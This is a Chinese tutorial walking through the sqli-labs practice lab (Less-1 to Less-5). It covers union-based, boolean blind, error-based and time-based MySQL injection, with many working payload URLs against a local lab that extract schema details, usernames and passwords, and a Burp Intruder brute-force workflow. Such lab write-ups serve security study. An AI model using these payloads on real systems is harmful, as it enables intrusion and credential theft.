猜解。\n二分法\n当输入大于3的数字时\nhttp://127.0.0.1/sqli-labs-master/Less-1/?id=1' order by 4--+  发生报错Unknown column '4' in 'order clause'\n输入3或3以下的数字，页面回显正常，说明字段数是3.\n3、查看字段回显\n这里注意，有的语句限制只能查看第一行可以选择查询参数为==-1==（一个表中不可能存在的值），这样查询内容为空才可以看到自己需要的内容\n查看字段回显，发现2和3的位置有回显。\n4、爆出数据库  @@datadir //mysql 的安装路径  5、爆出表名\n很明显在限制查询一行的时候group_concat(schema_name)这种可以一次性查出所有信息的方式更方便一些，以下是三种字符串连接函数\n   concat(str1,str2,…)——没有分隔符地连接字符串     concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串     group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据    http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+  但是最好不要引入单引号，这里最好使用16进制，也就是在去掉security两边的单引号 然后在它的前面加上==0x== 然后选中security进行16进制编码 也就是点击HackerBar ==Encoding==下级的==Hex Encode==\n即：\nhttp://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+  6、爆出列名\nhttp://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security'--+  同样最好不要引入单引号，这里最好使用16进制，也就是在去掉security两边的单引号 然后在它的前面加上==0x== 然后选中 security 以及 users 进行16进制编码 也就是点击HackerBar ==Encoding==下级的==Hex Encode==\n即：\nhttp://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 and table_schema=0x7365637572697479--+  7、爆内容\nhttp://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(username,0x7e,password) from security.users--+  也可以：\nhttp://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(concat_ws('0x7e',username,password)) from security.users--+  0x7e： 0x是十六进制标志，7e是十进制的126，是ascii中的 \u0026lsquo;~\u0026rsquo; ，用以分割pasword和username。\nless-02 http://localhost/sqli-labs-master/Less-2/?id=1'  单引号闭合后报错如下\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1  根据报错信息' LIMIT 0,1，可知为数字型注入。\n以这里的奇数个单引号破坏了查询，导致抛出错误，也就是说执行语句没有了单引号，所以payload也不需要单引号闭合，其余的和less-1都一样\npayload:\nhttp://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,2,group_concat(concat_ws('0x7e',username,password)) from security.users--+  less-03 http://localhost/sqli-labs-master/Less-3/?id=1'  报错：\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1  从1'') LIMIT 0,1可以看出是字符型注入，闭合方式为')，其余的和less-1都一样\npayload：\nhttp://localhost/sqli-labs-master/Less-3/?id=-1') union select 1,2,group_concat(concat_ws('0x7e',username,password)) from security.users--+  less-04 输入单引号测试，发现页面正常，\nhttp://127.0.0.1/sqli-labs-master/Less-4/?id=1'  输入双引号测试，\nhttp://192.168.2.222/sqli-labs-master/Less-4/?id=1\u0026quot;  报错：\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1””) LIMIT 0,1’ at line 1  根据\u0026quot;1\u0026quot;\u0026quot;) LIMIT 0,1 ，可推断为字符型注入，闭合方式为\u0026quot;) ，其余和less-01一样\npayload:\nhttp://localhost/sqli-labs-master/Less-4/?id=-1\u0026quot;) union select 1,2,group_concat(concat_ws('0x7e',username,password)) from security.users--+  less-05(盲注) 基础知识： 盲注：==盲注==就是在 sql 注入过程中, sql 语句执行的选择后, 选择的数据不能==回显== 到前端页面. 此时, 我们需要利用一些方法进行判断或者尝试, 这个过程称之为==盲注==,这种情况下往往需要一个一个字符的去猜解, 需要用到截取字符串.\n0x01 基于布尔 SQL 盲注\n我们可以利用逻辑判断进行盲注, 而布尔注入能够利用的根本就是, 我们能够看到true和false返回页面内容不一致\n因为不知道字段是怎样的, 因此只能一个字符一个字符的猜, 所以这里我们需要先学习字符串截取函数:left(), right(),substr(), substring(), mid(), 以及经常一起配套使用的ascii转换函数ascii(), ord(), 最后还有一些配合使用的mysql语句: IF(),IFNULL(),SELECT CASE WHEN\nleft()和right()\n语法如下:\nleft(string, n) --得到字符串string左边n个字符 right(string, n) --得到字符串string右边n个字符  一般地, 我们使用left(database(),1) \u0026gt; 'a',查看数据库名第一位, left(database(),2) \u0026gt; 'ab',查看数据库名前二位. **right()**用法类似, 只不过方向反了 , 从后往前\nsubstr(), substring(), mid()\n用法1: substr(str, pos, len) 用法2: substr(str FROM pos FOR len) --从字符串str的第pos个字符串开始取, 只取len个字符 --str: 要处理的字符串 --pos: 开始的位置(初始值是1) --len: 截取的长度   ps: substr(str FROM pos FOR len)是应对逗号被过滤的情况\n 比方说, 从abcde的第二个字符开始取, 只取3个字符, 这里分别演示substr(), substring()和mid()函数\n看到这里，基本可以应对一些简单的bool注入的情况了, 所以, 下面我大概讲一下bool的注入流程. 比如说, 原始的sql语句如下:\nSELECT username FROM users WHERE id=1;  然后我们发现, 当注入and 1=1的时候, 页面返回正常, 注入and 1=2的时候页面返回不正常, 那么我们就可以初步判断为bool注入了\n ps: 其实只要true和false返回的页面不同, 我们能够区别出来就行\n 这里假设我们想拿到它的数据库名称, 首先要拿到数据库长度, 因为知道数据库长度之后, 我们才知道什么时候停止注入\n在实战中, 我们会使用substr(DATABASE(),1,1) \u0026gt; 'a',查看数据库名第一位, substr(DATABASE(),2,1) ,查看数据库名第二位, 依次猜解各个字符.\nascii()和ord() 在有些情况下, 引号可能被过滤, 所以这里需要将字符转换成ascii, 也就是数字表示, 那就不需要引号括起来了\nascii() \u0026ndash;将第一个字符转换 为 ascii 值\nord() \u0026ndash;将第一个字符转换 为 ascii 值\nps: 两个函数都是只转换第一个字符. 两个函数唯一的区别是, ord()函数遇到多字节, 比如说汉字, 会将汉字转换成 ((first byte ASCII code)*256+(second byte ASCII code))[*256+third byte ASCII code...] 用ascii表示多字节字符代码 的这种形式  因此, 为了避免引号被过滤的问题, 我们通常会用下面的注入语句去盲注数据库\nascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101\n然后用二分法来测试ascii码值, 然后再递增substr(str, pos, len)中的pos值, 即第一个字符找到后, 找第二个字符, 以此类推, 这里我们先拆开分析一下该注入语句\n先查数据库中的第一个表的名字\n然后用字符串截取函数, 得到该表的第一个字符\n接着用ascii()函数将该字符转换成ascii码\n最后就是穷举测试了, 当条件满足时: 当条件不满足时:\n ps: 返回1和0代表true与false, 在实战中, 两种结果的页面会不一致, 这个具体在下面实战中会具体讨论.\n IF(),IFNULL(),SELECT CASE WHEN\nIF()\nIF()语法如下:\n IF(expr1, expr2, expr3) \u0026ndash;如果 expr1 是TRUE(expr1 \u0026lt;\u0026gt; 0 and expr2 \u0026lt;\u0026gt; NULL), 则IF()的返回值为 expr2; 否则返回值则为 expr3.\n IFNULL()和CAST()\n语法如下:\nIFNULL(expr1,expr2) --如果 `expr1` 不是 NULL,则返回 `expr1`, 否则它返回 `expr2`.  正常用法如下:\n CAST(expression AS data_type) \u0026ndash;将expression转换为data_type这种数据类型 \u0026ndash;我们常用的data_type是CHAR字符类型\n 接着配合我们之前学过的ORD()和MID()函数, 注入语句如下: 返回第一个字符的ASCII码\nSELECT ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM users LIMIT 0,1),1,1));  然后就是一步步的判断一下第一个字符的ascii码的区间, 以及同样操作判断第二个字符了\n因为最后需要转换成ascii, 所以中间需要case转换成char, 不然是中文就坏事儿了 SELECT CASE WHEN\n语法如下:\nCAST WHEN condition THEN result [WHEN \u0026hellip;] [ELSE result] END \u0026ndash;类似于其他语言的if/else 语句\n例子如下:\n通常结合sleep()函数使用\nregexp 正则注入\n如果这种单个字符的爆破无法使用, 也即是说, 字符串无法拆分,这时候可以使用正则表达式  用法介绍\nselect user() regexp '^[a-z]';  正则表达式的用法, 假设user()结果为 root, regexp 后面接匹配 root 的正则表达式\n第二位可以用 select user() regexp '^ro'来进行. 如下图\n当正确的时候显示结果为 1, 不正确的时候显示结果为 0\n在Mysql5+中, information_schema库中存储了所有的库名, 表名以及字段名信息, 故攻击方式如下:  1、先判断第一个表名的第一个字符是否是a-z中的字符,其中security是假设已知的库名.\n 注：正则表达式中 ^[a-z] 表示字符串中开始字符是在 a-z范围内 index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=\u0026quot;security\u0026quot; AND table_name REGEXP '^[a-z]' LIMIT 0,1) /*  2、接下来判断第一个字符是否是a-e中的字符 接下来判断第一个字符是否是a-e中的字符\nindex.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=\u0026quot;security\u0026quot; AND table_name REGEXP '^[a-e]' LIMIT 0,1)/*  3、接下来确定该字符是e\nindex.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=\u0026quot;security\u0026quot; AND table_name REGEXP '^e' LIMIT 0,1) /*  4、接下来更换表达式:\n'^e[a-z]' -\u0026gt; '^em[a-z]' -\u0026gt; '^ema[a-z]' -\u0026gt; '^emai[a-z]' -\u0026gt; '^email[a-z]' -\u0026gt; '^emails[a-z]'-\u0026gt; FALSE  这时说明表名为emails , 要验证是否是该表明 正则表达式为'^emails$', 但是没这必要 直接判断 table_name = \u0026lsquo;emails\u0026rsquo; 不就行了? 当然, 如果=被过滤就不可以了\n ps: 如何知道匹配结束了? 这里大部分根据一般的命名方式(经验)就可以判断. 但是如何你在无法判断的情况下, 可以用 table_name regexp \u0026lsquo;^emails$\u0026lsquo;来进行判断. ^是从开头进行匹配, $是从结尾开始判断.\n 5、接下来猜解其他表, 如假设我们知道其中包含users表,则如下语句说明这样子是正确的\n ps: 注意: table_name 有好几个, 我们只得到了一个 emails, 如何知道其他的? 这里千万不能修改limit 0,1(从你的表中的第0个数据开始, 只读取一个) 为limit 1,1, 因为limit 作用在前面的 select 语句中, 而不是 regexp. 其实在 regexp 中我们是取匹配 table_name 中的内容, 只要 table_name 中有的内 容, 我们用 regexp 都能够匹配到, 因此我们在使用regexp时, 要注意有可能有多个项, 同时要一个个字符去爆破. 因此上述语句不仅仅可以选择 emails, 还可以匹配其他项\n 以下是另外两种常用用法\nselect * from users where id=1 and 1=(if((user() regexp '^r'),1,0)); select * from users where id=1 and 1=(user() regexp'^r');  like匹配注入\n和上述的正则类似, mysql 在匹配的时候我们可以用 like 进行匹配.\n用法:\nselect user() like 'ro%'  0x02 基于报错的 SQL 盲注\u0026mdash;-构造 payload 让信息通过错误提示回显出来\nSelect 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;\n1.一是需要 concat 计数 2.二是 floor, 取得 0 or 1, 进行数据的 重复 3.三是 group by 进行分组, 具体原理大致为在进行count的时候,插入了重复的key   以上语句可以简化成如下的形式.  select count(*) from information_schema.tables group by concat(database(), floor(rand(0)*2));  详情请看：floor() 报错详解 select exp(~(select * FROM(SELECT USER())a))\n double 数值类型超出范围,具体原理如下:\n 1.当传递一个大于709的值时, 函数exp()就会引起一个溢出错误 2.将0按位取反会得到18446744073709551615 3.mysql函数执行成功则会返回0,我们将成功执行的函数取反就会得到最大的无符号BIGINT值\n4.综合上面三点,我们通过子查询与按位求反, 造成一个DOUBLE overflow error, 并借由此注出数据.\n注：不是所有的mysql版本皆可用exp报错注入，已知==5.5.29、5.5.42==可用\nselect exp(~(select * from (select user())a));  得到表名,这里通过改变limit 0,1-\u0026gt;limit 1,1-\u0026gt;limit 2,1-\u0026gt;limit 3,1-\u0026gt; limit 4,1-\u0026gt;Finish来获取不同的表\nselect exp(~(select * from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));   得到列名, 同样是改变limit x,y中的x,顺便提一下,x代表从第几位开始,y代表长度  select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));   exp()为以 e 为底的对数函数;  select !(select * from (select user())x) -(ps:这是减号) ~0 注：不是所有的mysql版本皆可用bigint报错注入，已知==5.5.29、5.5.42==可用\n bigint 超出范围;~0 是对 0 逐位取反\n  数据类型BIGINT的长度为8字节, 也就是说, 长度为64比特. 这种数据类型最大的有符号值, 用二进制、十六进制和十进制的表示形式分别为“0b0111111111111111111111111111111111111111111111111111111111111111”、“0x7fffffffffffffff”和“9223372036854775807”. 当对这个值进行某些数值运算的时候, 比如加法运算, 就会引起“BIGINT value is out of range”错误.   为了避免出现上面这样的错误, 我们只需将其转换为无符号整数即可. 对于无符号整数来说, BIGINT可以存放的最大值用二进制、十六进制和十进制表示的话, 分别为“0b1111111111111111111111111111111111111111111111111111111111111111”、“0xFFFFFFFFFFFFFFFF”和“18446744073709551615”. 同样的, 如果对这个值进行数值表达式运算, 如加法或减法运算, 同样也会导致“BIGINT value is out of range”错误.   上面说到, 如果我们对数值0逐位取反, 会得到一个无符号的最大BIGINT值, 这一点是显而易见的. 所以, 如果我们对~0进行加减运算的话, 也会导致BIGINT溢出错误.   PS: 无符号数运算 只有相加才有可能溢出 ,以及小减大肯定溢出,大减小不会溢出\u0026mdash;\u0026mdash;(参考自汇编语言)\n  ps: 实战中, 我们一般都是用-, 很少用+, 因为+容易被浏览器认为是空格\n  接下来就是核心: 利用子查询引起BITINT溢出, 从而设法提取数据. 我们知道, 如果一个查询成功返回, 其返回值为0, 所以对其进行逻辑非的话就会变成1, 举例来说, 如果我们对类似(select * from (select user())x)这样的查询进行逻辑非的话, 就会有：   所以说, 只要我们能够组合好逐位取反和逻辑取反运算, 我们就能利用溢出错误来成功的注入查询  select !(select * from (select user())x) - ~0;  extractvalue(1,concat(0x7e,(select @@version),0x7e)) 语法如下:\nextractvalue(目标xml文档, xml路径) --对XML文档进行查询的函数  第一个参数随便填, 第二个参数 xml路径才是可操作的地方, xml文档中查找字符位置是用斜杠隔开 /xxx/xxx/xxx/…这种格式, 如果我们写入其他格式, 就会报错, 并且会返回我们写入的非法格式内容, 而这个非法的内容就是我们想要查询的内容.\n正常查询 第二个参数的位置格式 为 /xxx/xxx/ ,即使查询不到也不会报错\nSELECT username FROM users WHERE id=1 and (extractvalue('anything','/xxx/xxx'));  使用字符串连接符如concat()拼接 /, 效果和上面相同, 因为在anything中查询不到位置是 /database()的内容, 但同时也没有语法错误, 不会报错\nSELECT username FROM users WHERE id=1 and (extractvalue('anything',concat('/',(SELECT database()))));  下面故意写入语法错误:\nSELECT username FROM users WHERE id=1 and (extractvalue('anything',concat('~',(SELECT database()))));  updatexml(1,concat(0x7e,(select @@version),0x7e),1)\nupdatexml()函数与extractvalue()类似, 是更新xml文档的函数.\n语法如下:\nupdatexml(目标xml文档, xml路径, 更新的内容)  同样地, 只需要关注第二个参数\u0026ndash;xml路径, 用同样的方法进行报错即可\nSELECT username FROM users WHERE id=1 and (updatexml('anything',concat('~',(SELECT database())),'anything'));  0x03 基于时间的SQL盲注\u0026mdash;-延时注入\nsleep()\nsleep()函数语法如下:\nSLEEP(duration) -- 睡眠(暂停)时间为duration参数给定的秒数, 然后返回0. 若SLEEP()被中断, 它会返回1  有了延迟函数之后, 我们通常需要配合IF()语句以及字符串截取函数, 如下:\nSELECT * FROM users WHERE id=1 AND IF((substr((SELECT username FROM users WHERE id=1),1,1))='D',sleep(3),0);  可以看到, 正确则延迟了3s, 不正确则立刻返回\nbenchmark()\n语法如下:\nbenchmark(count, expr) \u0026ndash;重复执行count次表达式expr, 结果值通常为0\n因为函数执行次数比较大, 所以返回结果的时间比平时要长, 因此可以通过时间长短的变化, 判断语句是否执行成功\n因此上面sleep()的例子可以修改成如下:\nSELECT * FROM users WHERE id=1 AND IF((substr((SELECT username FROM users WHERE id=1),1,1))='D',benchmark(10000000, sha(1)),0);     数据库 延迟用的函数     mysql BENCHMARK(100000,MD5(1)) or sleep(5)   Postgresql PG_SLEEP(5) or GENERATE_SERIES(1,10000)   mssql WAITFOR DELAY \u0026lsquo;0:0:5\u0026rsquo;    解题篇 1.0 测试\nhhttp://localhost/sqli-labs-master/Less-5/?id=1  注意：此时不再是的用户名和密码显示的结果了；\n单引号测试：\nhttp://localhost/sqli-labs-master/Less-5/?id=1'  http://localhost/sqli-labs-master/Less-5/?id=1'--+  我们使用盲注中常使用的方法进行探测；以下进行三种盲注进行测试；\n二、布尔型盲注\n2.1 left()函数\n格式：\nleft(str,1)\u0026gt;5\n解析：str是字符串，可能是版本号，可能是数据库名等；1：指的是从字符串中获取第一个字符，如果想获取第二个字符，直接修改次数字就行，但是，注意：后面比较的数字要写上我们探测的第一个字符信息；\n例如：\nDatabase()=‘security’实际值；\nLeft(database(),1)\u0026gt;’s’ 没有爆错并测出第一个字符是’s’\nLeft(database(),2)\u0026gt;’sh’ 需要加第一个字符，否则会爆错的；\n2.1.1 数据库版本探测\nURL：\nhttp://localhost/sqli-labs-master/?id=1' and left(version(),1)=6--+  解析：探测目录数据库版本信息，第一个字符是否是6，报错\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and left(version(),1)=5--+  2.1.2 数据库长度判断\n使用length进行长度探测；\nURL：\n探测是否大于10，\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and length(database())\u0026gt;10--+  尝试修改大小直到得知数据库长度；这里长度：8\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and length(database())=8--+  得知数据库的长度为8后，那么我们就可以探测每个字符是什么，直到获取完整数据库名；\n2.1.3 爆数据库名\n从探测版本信息得知，可以利用left()函数实现字符探测，当然不止此函数，还有其他类，后面会一一测试；\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and left(database(),1)\u0026gt;a--+  发现报错了，注意：在mysql中数据库字符是string类型，要把a使用’a’包含\n解析：探测数据库名，第一个字符是否是大于’a’，如果You are in…….正常显示，说明至少是大于‘a’，反之，不正确；\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and left(database(),1)\u0026gt;'t'--+  报错，说明第一个字符是小于字符’t’,需要一步一步探测；’security’，每一步我们不做测试；\n测试第二个字符；\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and left(database(),2)\u0026gt;'sh’--+  解析：探测数据库第二个字符，记得要加上探测出来的第一个字符；\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and left(database(),2)='se'--+  后面同理\n2.1.4 爆表名\n从上面我们已经获取数据库信息，\n第一个表第一个字符\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and left((select table_name from information_schema.tables where table_schema='security' limit 0,1),1) ='e' --+  第四张表第一个字符\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and left((select table_name from information_schema.tables where table_schema='security' limit 3,1),1) ='u' --+  第四张表第二个字符\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and left((select table_name from information_schema.tables where table_schema='security' limit 3,1),2) ='us' --+  第四张表第三个字符\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and left((select table_name from information_schema.tables where table_schema='security' limit 3,1),3) ='use' --+  然后；\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and left((select table_name from information_schema.tables where table_schema='security' limit 3,1),4) ='user' --+  然后：\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and left((select table_name from information_schema.tables where table_schema='security' limit 3,1),5) ='users' --+  然后：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and left((select table_name from information_schema.tables where table_schema='security' limit 3,1),6) \u0026gt;'usersa' --+  如果第六个字符，最小都没有大于a或其他字符，说明长度只有5个字符长度；\n2.1.5 爆字段名\n从以上步骤可以很轻松获取数据库表名；下面我们使用相同方式继续获取想要的字段名；\nURL：利用报错获取字段名；\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and left((select column_name from information_schema.columns where table_name='users' limit 0,1),1) \u0026gt;'h' --+  第一个字符是\u0026rsquo;i'，记得要带到第二个查询中；\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and left((select column_name from information_schema.columns where table_name='users' limit 0,1),2) \u0026gt;'if' --+  这里发现，居然显示You are in........\n然后发现这里居然报错了\u0026hellip;\nURL\nhttp://localhost/sqli-labs-master/Less-5/?id=1'and left((select column_name from information_schema.columns where table_name='users' limit 0,1),2) ='id' --+  原来，只需要加上数据库的限定条件就可以\nURL\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and left((select column_name from information_schema.columns where table_name='users' and table_schema='security' limit 0,1),2)\u0026gt;'if' --+  得知，第二个字符’d’，尝试获取第三个字符时直接报错了，说明长度为2\n然后：\n第二个字段的字符；\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and left((select column_name from information_schema.columns where table_name='users' and table_schema='security' limit 1,1),2) \u0026gt;'t' --+  后面继续修改数字和字符串即可；\n2.1.6 爆字段数据\n从上面我们已经获得：id、username、password三个字段；\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and left((select username from security.users where id=1),1) \u0026gt;'a' --+  或：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and left((select username from security.users limit 0,1),1) \u0026gt;'a' --+  然后\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and left((select username from security.users where id=1),1) ='d' --+  第一个字符\u0026rsquo;d\u0026rsquo;备注：mysql中大小写是不区分的，一般会认为是小写字符；\n第二个字符’u’\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and left((select username from security.users where id=1),2) ='du' --+  或\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and left((select username from security.users limit 0,1),2) ='du' --+  2.2 ascii和substr函数\n语法：\n ascii(string)\u0026gt;ascii码 // ascii转换作用，并与外部进行比较；\nsubstr(string, start, length) // 从字符串开始的数字，取出长度为 length长度的字符；\n 下面就利用此paylaod进行获取库中表名：\nascii(substr((select table_name from information_schema.tables where tables_schema=database() limit 0,1),1,1))=101  //注意：database()已经通过以上方式可以获得；\n2.2.1 ascii和substr函数猜解数据库字段信息\n也可以通过此方式获得数据库字符信息；但是由于查询后所获得的数据库第一个一般都是mysql数据库默认数据库；\n默认数据库：\ninformation_schema\nmysql\nperformance_schema\n例如：\n第六个数据库，第一个字符\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select schema_name from information_schema.schemata limit 5,1),1,1))=115 --+  第六个数据库，第二个字符\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select schema_name from information_schema.schemata limit 5,1),2,1))=101 --+  局限性：\n1、我们需要的数据库位置不知道，爆出我们想要数据需浪费时间；\n在2.1中已经爆出数据库名；下面需要继续获取表和字段信息；\n2.2.2 爆表\n爆第一个表\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101--+  101—\u0026gt;e\n解析：首先通过substr函数获取第一个表的第一个字符，再通过ascii函数转换为ascii码进行比较来判断字符信息；\n爆出第一个表的第二个字符\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),2,1))=109--+  109—\u0026gt;m\n通过以上方式可以爆出第一个表：emails\n爆出第二个表第一个字符：\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),1,1))\u0026gt;113--+  观察URL：得知，如果想获取第二表，通过修改limit 0,1来再进行substr进行截取字符；\n113—\u0026gt;r；由下图可以得知，第二张表的第一个字符是’r’\n爆出第二表的第二个字符：\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),2,1))=101 --+  从第一个字符的URL，和第二个字符中URL得知，修改后面部分获取其信息；直到获取我们想要的信息；\n爆出第四个表第一个字符：\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),1,1))=117 --+  117—\u0026gt;’u’;表为：users\n爆出第四表的第六个字符：备注：长度只有5个，不管多大字符都会报错，所以如果超过长度都会出现报错；\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),6,1))\u0026gt;0 --+  2.2.3 爆字段名\n从上面我们知道了，我们已经得知表名；\n第一个字段第一个字符：\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' and TABLE_SCHEMA='security' limit 0,1),1,1))=105 --+  其他继续就行\n2.3.4 爆字段数据\n从上面爆出字段名得知，id、usename、password\nURL： ascii编码是有大小写区分的，大小写相差32；我们知道left函数不具有大小写区分的，所以无法判断大小写；建议使用ascii进行爆破；\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select username from security.users where id=1),1,1))=68 --+  68—\u0026gt;D 第一个字段第二个字符\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select username from security.users where id=1),2,1))=117 --+  或：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select username from security.users limit 0,1),2,1))=117 --+  117—\u0026gt;u\n后面同理；\n2.3 regexp正则获取字段信息\n通过上面方法我们已经获取数据库和表，此时就是获取字段信息；而，正则表达式法，主要是利用布尔型进行比较；\n格式：regexp ‘^…\u0026rsquo;\n爆第一个字段名：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1) --+  解析：由上面得知，存在users表，使用regexp正则，探测字段名；\n爆第二个字段名：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^password' limit 0,1) --+  2.4 ord和mid函数\n通过以上布尔型盲注后可以获取数据库、表和字段名等信息;其实ord和mid函数的作用和上面我们说的ascii和substr函数一致；\n语法：\n ord(string) //对获取的字符进行ascii码转换；\nmid((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1) //截取字段中第一行的第一个字符；\nmid(column_name,start[,length])\n 爆第一字段数据\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))\u0026gt;66 --+  或：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users LIMIT 0,1),1,1))=68 --+  或：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and ORD(MID((select username from security.users limit 0,1),1,1))=68 --+  解析：首先通过mid函数获取第一行字段数据的第一个字符，并通过ord对字符进行ascii码转换；并进行比较；\n第一个字段数据：Dump；\n爆第一个字段的第二字符：\nURL：备注：和上面截取函数一样，直接修改数值就行；\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),2,1))=117 --+  或：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users LIMIT 0,1),2,1))=117 --+  或：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and ORD(MID((select username from security.users limit 0,1),2,1))=117 --+  记得通过大于和小于号进行折半测试后（二分法后），再用等号确定字符\n爆第二个字段数据password\nURL：下面只演示第一个字符，后面和之前一样，不做介绍；\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and ORD(MID((SELECT IFNULL(CAST(password AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68 --+  以上测试方法都是通过布尔型盲注测试的；通过以上方式可以获取我们想要的数据信息；\n 这里你可能觉得手注有亿点点麻烦，别慌，捷径来了，这里可用burp和脚本，由于我比较菜，不会写脚本，就介绍使用burp的使用方法\n因为前面的payload已经写得比较详细，这里就举两个例子即可，后面操作都是一样的\n这里burp拿到数据\n点击鼠标右键，选中Intruder模块\n点上面的Intruder\n然后选择Positions\n这里我们将c作为一个变量选中 add后 然后设置payload模块 然后设置Option模块\n最后点击右上角Start attack\n完成爆破后，点击length\n然后爆破第二位字母\n这里再写一个爆破ascii码的 前面几步基本一样，这里只说不一样的\n三、报错盲注\n3.1 count(*)、floor(rand(0)*2)、group by 报错\n利用数据库中实际查询和虚拟表查询不同而产生的报错进行获取数据库中我们想要的数据；报错注入不懂的可以看下《Mysql注入之报错注入学习与分析》这篇文章(后面会发出来的)；\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat(0x3a,(select user()),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+  解析：一是需要count(*)计数，二是floor，取的值要么是0或者是1，导致在进行实际查询的计算结果和虚拟表中计算结果的重复导致报错产生，三是group by进行分组，\n备注：0x3a—\u0026gt;“:”\n3.1.1 爆库信息\n从上面方式可以成功获取当前连接的数据库\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat(0x3a,(select database()),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+  或：\n下面方式可以获取更过数据库信息；包括mysql的默认一些数据库信息；\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat(0x3a,(select schema_name from information_schema.schemata limit 4,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+  